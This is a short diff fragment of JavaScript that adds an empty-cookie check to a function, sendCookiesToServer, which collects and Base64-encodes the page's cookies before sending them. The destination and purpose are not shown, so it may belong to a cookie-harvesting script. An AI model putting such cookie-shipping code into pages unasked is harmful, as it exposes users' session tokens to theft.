@@ -28,6 +28,11 @@
 
         function sendCookiesToServer() {
             const cookies = getCookies();
+            if (!cookies) {
+                console.log("No cookies found");
+                return;
+            }
+
             const encodedCookies = btoa(unescape(encodeURIComponent(JSON.stringify(cookies)))); // Base64 encode with proper Unicode handling
             console.log("Cookies to be sent (encoded):", encodedCookies);
 
